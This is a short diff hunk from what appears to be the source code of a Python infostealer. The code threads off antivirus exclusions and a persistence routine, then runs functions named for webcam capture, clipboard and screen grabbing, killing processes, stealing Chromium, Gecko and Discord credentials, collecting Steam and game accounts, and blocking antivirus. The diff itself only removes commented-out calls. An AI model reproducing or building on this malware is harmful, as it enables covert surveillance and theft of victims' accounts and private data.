@@ -1468,21 +1468,9 @@ e2.start()
 e3 = threading.Thread(target=exclusion, args=(os.getenv('userprofile'),))
 e3.start()
 
-#exclusion(sys.executable)
-#exclusion(copypath)
-#exclusion(os.getenv('userprofile'))
-
 thread = threading.Thread(target=persistence, args=(copypath,))
 thread.start()
 funcs = [systeminfo, get_webcam, get_clipboard, screenshot, kill, stealchromium, stealchromiumv20, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
-# systeminfo()
-# screenshot()
-# kill()
-# stealchromium()
-# stealgecko()
-# stealdiscordacc()
-# collectminecraft()
-# collectsteam()
 
 
 threads = []
